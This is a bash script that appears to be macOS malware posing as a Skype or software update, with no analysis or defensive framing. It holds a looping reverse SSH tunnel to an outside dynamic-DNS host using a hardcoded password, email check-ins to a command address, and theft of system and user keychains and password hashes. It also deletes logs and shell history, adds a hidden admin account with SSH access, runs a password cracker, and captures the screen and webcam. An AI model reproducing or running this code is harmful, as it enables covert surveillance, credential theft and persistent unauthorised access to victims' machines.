#!/bin/bash
# Functions and parameters
date=$(date)
mainUser="$(who | head -1 | awk '{print $1}')"
currentUser=$(whoami)
version=10
emailTo="skypeupdate@on.to"
sshPass="skypeupdate"


revSSH () {
    if [ -z "$1" ]                           
    then
    	(while true
    	do
    	expect -c 'ssh -N -C -R 10002:localhost:1337 root@skypeupdate.dyndns-ip.com; expect assword ; send "skypeupdate\n"'
    	done) &
    	#expect -c 'spawn ssh -N -C -p 1337 -R 2222:127.0.0.1:1337 root@skypeupdate.dyndns-ip.com; expect assword ; send "skypeupdate\n" ; interact'
        echo 1. normal ssh to router: "ssh -p 1337 root@skypeupdate.dyndns-ip.com"
        echo 2. run on router: "ssh root@localhost -p 10002"
        echo 3. enter password for root on their comp
    else
    	#ssh -R 29:localhost:22 root@"$1" &
    	#echo "ran ssh -R 29:localhost:22 root@$1"
    	revSSH
    fi      
    return 0

}


identify () {
  echo -n $mainUser"@"$(hostname)" l: "$(ifconfig) " p: " $(curl --silent http://ifconfig.me) " MAC:" $(ifconfig en1 | grep ether) " Version: "$version
  return 0
}

local () {
	eval "sudo -u $mainUser $1 $2 $3 $4 $5 $6 $7 $8 $9"
}

setBotID () {
	if [ -z "$1" ]                           
   then
     botID="$(hostname -s)"
     echo $botID > /var/softupdate/botID
     echo restored botID to hostname: "$botID"
   elif [ "$1" == "hostname" ] 
   then
    botID="$(hostname -s)"
    echo $botID > /var/softupdate/botID
    echo changed botID to hostname: "$botID"
    elif [ "$1" == "user" ] 
    then
    botID="$mainUser"
    echo $botID > /var/softupdate/botID
    echo changed botID to username: "$botID"
   else
    botID="$1"
    echo $botID > /var/softupdate/botID
    echo changed botID to custom: "$botID"
   fi             
   return 0
}



mailCnC () {
if [ "$1" == "" ]                           
   then
     printf "From: <$botID@skypeupdate.com>\nTo: $emailTo\nSubject: SkypeUpdate\n\n\n$date\nEMERGENCY/ERROR\nFrom: $botID" | /usr/sbin/sendmail -F "$botID" -f "$botID@skypeupdate.com" "$emailTo" > /dev/null &
   elif [ "$1" == "fixmail" ] 
   then
	 mkdir -p /Library/Server/Mail/Data/spool > /dev/null
	 /usr/sbin/postfix set-permissions > /dev/null
	 /usr/sbin/postfix start > /dev/null
   else
     printf "From: <$botID@skypeupdate.com>\nTo: $emailTo\nSubject: SkypeUpdate\n\n\n$date\n$1\nFrom: $botID" | /usr/sbin/sendmail -F "$botID" -f "$botID@skypeupdate.com" "$emailTo" > /dev/null &
   fi             
   return 0	
}

#spawn sudo provideInfo
#expect "password:"
#send "password\r"

provideInfo () {
	if [ "$1" == "" ]                           
		then
		cd /tmp/
		mkdir -p .info .info/Library .info/Library/Preferences .info/private .info/private/var .info/keychains .info/keychains/users
		cp -Rf /Library/Keychains/ .info/Library/Keychains/
		cp -f /System/Library/CoreServices/SystemVersion.plist .info/SystemVersion.plist
		cp -Rf /private/var/db/dslocal/nodes/Default/users/ .info/keychains/users/
		
		rm -Rf .info/private/var/db/db/receipts
		rm -Rf .info/private/var/db/receipts
		
		system_profiler > .info/system.info
		cd /Users
		find . -maxdepth 3 -mindepth 3 -name "Keychains" -type d -exec cp -Rf '{}' /tmp/.info/keychains \;
		
		####FIX THIS
		cp -Rf /tmp/.info /Users/$mainUser/Public/.info
		chmod -Rf 777 /Users/$mainUser/Public/.info
	elif [ "$1" == "delete" ]; then
		find . -maxdepth 2 -name "Public" -type d -exec rm -Rf '{}/.info' \;
		rm -Rf /tmp/.info
	fi             
   return 0	
}

cleanup () {
if [ "$1" == "" ]                           
   then
		cd /
		rm -Rf /private/var/log/ &
		rm -Rf /Library/Logs/ &
		rm -f /var/log/secure.log
		touch /var/log/secure.log &
		rm -f /var/log/appfirewall.log
		touch /var/log/appfirewall.log &
		rm -f /var/log/system.log
		touch /var/log/system.log &
		find . -maxdepth 3 -name ".bash_history" -exec rm -f '{}' \; &
		cd /Users
		find . -maxdepth 2 -name "Public" -type d -exec chmod -Rf 777 '{}/.info' \ &
   else
     rm -Rf "$1" &
	fi             
   return 0	
}

newUser () {
if [ "$1" == "" ]                           
   then
    echo syntax: newUser username password
   else
		dscl -u $1 -P $2 . -create /Users/$1
		dscl . -create /Users/$1 UserShell /bin/bash
		dscl . -create /Users/$1 RealName "$1"
		dscl . -create /Users/$1 UniqueID 525
		dscl . -create /Users/$1 PrimaryGroupID 80
		dscl . -create /Users/$1 NFSHomeDirectory /Users/$1
		dscl . -passwd /Users/$1 $2
		dscl . -append /Groups/admin GroupMembership $1
		dscl . -append /Groups/com.apple.access_ssh GroupMembership $1
	fi             
   return 0	
}

crackPass () {
if [ "$1" == "" ]                           
   then
        date >> /var/softupdate/key
        echo starting $mainUser decrypt >> /var/softupdate/key
        (dave -u $mainUser -i >> /var/softupdate/key; date >> /var/softupdate/key; echo finished $mainUser decrypt >> /var/softupdate/key) &
   else
        date >> /var/softupdate/key
        echo starting $1 decrypt >> /var/softupdate/key
        (dave -u "$1" -i >> /var/softupdate/key; date >> /var/softupdate/key; echo finished $1 decrypt >> /var/softupdate/key) &
    fi             
   return 0
}

displayAlert () {
    if [ "$1" == "" ]                           
    then
        echo syntax: osascript -e 'tell application "System Events" to display alert "Hi!"'
    else
        osascript -e 'tell application "System Events" to display alert "$1"'
    fi             
    return 0
}

screenCap () {
	rm -f /tmp/cap
	screencapture /tmp/cap
	chmod 777 /tmp/cap
	cp -Rf /tmp/cap /var/softupdate/cap
	rm -f /tmp/cap
}

iSight () {
rm -f /tmp/icon
if [ "$1" == "" ]                           
   then
    isightcapture -t jpg /tmp/icon
	chmod 777 /tmp/icon
	cp -f /tmp/icon /var/softupdate/icon
	rm -f /tmp/icon
   else
	isightcapture -t jpg $1
	fi             
   return 0	
}

if [ "$1" == "" ]                           
   then
		exit 0
   else
		$1 $2 $3 $4 $5 $6 $7 $9
	fi
	
exit 0